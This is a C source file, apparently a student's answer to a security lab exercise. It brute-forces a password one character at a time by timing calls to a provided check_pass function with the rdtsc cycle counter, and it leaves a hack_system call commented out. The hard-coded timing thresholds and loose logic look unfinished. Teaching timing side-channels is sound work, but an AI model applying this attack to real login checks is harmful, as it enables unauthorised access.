#include <stdio.h>
#include <string.h>
#include <unistd.h>

// include our "system" header
#include "sysapp.h"

// Read cycle counter
#define rdtsc() ({ unsigned long a, d; asm volatile("rdtsc":"=a" (a), "=d" (d)) ; a; })

int main(int argc, char **argv) {
    char guess[33];
    long a,d;
    float f,g;
    // set guess to zeros
    bzero(guess, sizeof(guess));

    //
    // do the guessing (this is where your code goes)
    //   we suggest a loop over the size of the possible
    //   password, each time trying all possible characters
    //   and looking for time deviations
    //
    a = rdtsc();
    check_pass(guess);
    //char c = 73;
    //guess[0]=c;
    //c = 115;
    //guess [1] = 115;
    for (int i=0;i<12;i++){
    for (char c = 33; c<127; c++){
        guess[i] =c;
        
	
	a = rdtsc();
	check_pass(guess);	
    //if (check_pass(guess)) {
    //    printf("Password Found!\n");
    //    hack_system(guess);
    //};
	d = rdtsc();
	
	if (i >0){
	    f = (d-a)-f;
	}
        else{
	    f = d-a;
	}
	printf("%f\t",f);   
	if (f>1620&&f<1700 ){
	    printf(guess);
	    printf(" %f\t",f);
	    break;
	}
	if(f>790 && i >0){
	    printf(guess);
	    printf(" %f\t",f);
	    break;
	}
    }
    }
    printf("Could not get the password!  Last guess was %s\n", guess);
    return 1;
};
